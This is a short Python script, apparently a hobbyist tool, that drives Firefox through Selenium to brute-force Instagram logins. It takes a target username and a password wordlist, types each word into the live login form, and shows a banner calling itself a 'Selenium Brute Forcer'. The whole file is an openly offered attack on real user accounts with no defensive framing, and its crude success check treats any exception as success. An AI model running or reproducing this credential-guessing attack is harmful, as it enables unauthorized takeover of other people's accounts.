from selenium import webdriver
import time

print("""
                 _    ____       _     _
 _ __ ___   ___ | |_ / __ \  ___| |__ | |__  _   _ 
| '__/ _ \ / _ \| __/ / _` |/ _ \ '_ \| '_ \| | | |
| | | (_) | (_) | || | (_| |  __/ |_) | |_) | |_| |
|_|  \___/ \___/ \__\ \__,_|\___|_.__/|_.__/ \__, |
                     \____/                  |___/ 
""")
time.sleep(3)
print("Selenium Brute Forcer !")

url = "https://www.instagram.com/"

usr = input("Nick : ")
wordlist = input("Wordlist : ")

browser = webdriver.Firefox()
browser.get(url)
time.sleep(2)
with open(wordlist,'r',encoding='UTF-8') as file:
    for i in file:
        
        username = browser.find_element_by_xpath("//*[@id='loginForm']/div/div[1]/div/label/input")
        password = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')
        giris = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')

        try:
            username.clear()
            password.clear()
            username.send_keys(usr)
            password.send_keys(i)
            
            giris.click()
            time.sleep(1)
        except:
            print("Accomplished !")
